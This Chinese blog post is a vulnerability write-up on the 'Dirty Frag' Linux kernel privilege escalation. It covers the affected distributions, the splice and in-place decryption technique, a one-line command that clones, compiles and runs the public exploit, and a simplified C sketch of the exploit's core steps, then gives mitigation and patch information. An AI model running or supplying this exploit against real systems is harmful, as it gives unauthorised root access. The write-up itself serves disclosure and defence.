---
title: "DirtyFrag_Linux内核本地提权漏洞QVD-2026-24699"
slug: dirtyfrag_linuxnei-he-ben-di-ti-quan-lou-dong-qvd-2026-24699
cover: ""
date: 2026-05-08
categories:
  - 权限提升
halo:
  site: http://www.hzhsec.top
  name: 6f78122d-b0bc-45de-9650-8cd572328c95
  publish: true
---

## 一、漏洞简介


Dirty Frag 是一个严重的 Linux 内核本地提权 (LPE) 漏洞链，由韩国安全研究员 Hyunwoo Kim (@v4bel) 发现。通过串联 xfrm-ESP Page-Cache Write 和 RxRPC Page-Cache Write 两个漏洞，攻击者可以在几乎所有主流 Linux 发行版上获取 root 权限。

这是一个确定性逻辑漏洞，不依赖竞态条件 (race condition)，首次尝试即可成功提权，且失败时通常不会导致 kernel panic。

该漏洞属于 Dirty Pipe / Copy Fail 同类漏洞的延伸，但危害程度被认为超过 Copy Fail。

## 二、影响版本

- **xfrm-ESP 变体**：自内核提交 `cac2661c53f3` (2017-01-17) 起至最新版本
- **RxRPC 变体**：自内核提交 `2dc334f1a63a` (2023-06) 起至最新版本
- 有效影响时间：约 9 年

### 已验证的受影响发行版

- Ubuntu 24.04.4: 6.17.0-23-generic
- Ubuntu 26
- RHEL 10.1: 6.12.0-124.49.1.el10_1.x86_64
- CentOS Stream 10: 6.12.0-224.el10.x86_64
- AlmaLinux 10: 6.12.0-124.52.3.el10_1.x86_64
- Fedora 44: 6.19.14-300.fc44.x86_64
- openSUSE Tumbleweed: 7.0.2-1-default
- Arch Linux
- **WSL2** (微软 Windows Subsystem for Linux 2)

## 三、漏洞详情

### 漏洞链组成

1. **xfrm-ESP Page-Cache Write**
   - 路径：`esp_input()` 跳过 `skb_cow_data()`，直接在 splice 注入的 frag 页上执行 in-place AEAD 解密
   - 原语：4 字节任意 STORE（攻击者可控制位置和值）
   - 条件：需 `CAP_NET_ADMIN`（可通过 `unshare(CLONE_NEWUSER)` 获得）
   - 触发：IPsec ESP over UDP (端口 4500)

2. **RxRPC Page-Cache Write**
   - 路径：`rxkad_verify_packet_1()` 在 splice 注入的 frag 上执行 in-place `pcbc(fcrypt)` 解密
   - 原语：8 字节 STORE（值为 `fcrypt_decrypt(C, K)`，需暴力搜索 key）
   - 条件：无需命名空间权限，Ubuntu 默认加载 `rxrpc.ko`
   - 目标：修改 `/etc/passwd` 第1行，利用 PAM `nullok` 策略空密码登录 root

两者互补覆盖所有主流发行版的盲区。

### 利用原理

利用 `splice()` 零拷贝路径：
1. 将只读文件 (`/usr/bin/su`) 的 page cache 页钉入内核 frag 槽
2. 利用 IPsec ESP 解密路径的 in-place crypto 操作
3. 将可信 ELF 二进制覆盖为返回 root shell 的微型 ELF（192字节）
4. 一次 `execve("/usr/bin/su")` 即可获得 root shell

## 四、漏洞复现

### 一键利用

```bash
git clone https://github.com/V4bel/dirtyfrag.git && cd dirtyfrag && gcc -O0 -Wall -o exp exp.c -lutil && ./exp
```

### 核心 PoC 代码

> PoC 较长（~500行），完整代码见 [GitHub: V4bel/dirtyfrag/exp.c](https://github.com/V4bel/dirtyfrag/blob/main/exp.c)

```c
// 核心原理示意（简化版）
// 1. 创建新的 user/net namespace
unshare(CLONE_NEWUSER | CLONE_NEWNET);
// 2. 注册 XFRM SA，将 shellcode 的 4 字节 chunk 放入 seq_hi
struct xfrm_replay_state_esn esn = {
    .bmp_len = 1, .seq = 100, .replay_window = 32,
    .seq_hi = patch_seqhi,        /* 要 STORE 的 4 字节 */
};
put_attr(nlh, XFRMA_REPLAY_ESN_VAL, &esn, sizeof(esn) + 4);
// 3. 通过 splice 将只读文件页钉入 socket
splice(file_fd, &offset, pipe_write, NULL, 16, SPLICE_F_MOVE);
splice(pipe_read, NULL, sk_send, NULL, 24+16, SPLICE_F_MOVE);
// 4. 触发 UDP encap ESP 输入 → esp_input → in-place decrypt → 4 byte STORE
// 5. 循环 48 次，写入 192 字节 shellcode
// 6. execve("/usr/bin/su") 获得 root shell
```
**简单复现**:
复现前:
![image.png](https://cdn.jsdmirror.com/gh/hzhsec/upload@main/20260508121334057.png)
复现后:
![image.png](https://cdn.jsdmirror.com/gh/hzhsec/upload@main/20260508121435619.png)




## 六、修复建议

### 临时缓解方案

禁用相关内核模块：

```bash
sh -c "printf 'install esp4 /bin/false\ninstall esp6 /bin/false\ninstall rxrpc /bin/false\n' > /etc/modprobe.d/dirtyfrag.conf; rmmod esp4 esp6 rxrpc 2>/dev/null; true"
```
![image.png](https://cdn.jsdmirror.com/gh/hzhsec/upload@main/20260508121718895.png)

验证：
```bash
lsmod | grep -E 'esp4|esp6|rxrpc'
# 若无输出，则已缓解
```

**注意**：如果在应用缓解措施之前已运行过 PoC，需清空页缓存：
```bash
echo 3 | sudo tee /proc/sys/vm/drop_caches
```
或直接重启系统。

### 官方补丁

内核主线已合入补丁：https://git.kernel.org/pub/scm/linux/kernel/git/netdev/net.git/commit/?id=f4c50a4034e6

各发行版 backport 后请及时更新。

## 七、漏洞来源

- GitHub PoC: https://github.com/V4bel/dirtyfrag/
- 安全通告: https://www.secrss.com/articles/90064
- 技术细节 Write-up: https://github.com/V4bel/dirtyfrag/blob/main/assets/write-up.md
- Tom's Hardware: https://www.tomshardware.com/tech-industry/cyber-security/dirty-frag-exploit-gets-root-on-most-linux-machines-since-2017-no-patches-available-no-warning-given-copy-fail-like-vulnerability-had-its-embargo-broken

> 更新: 2026-05-08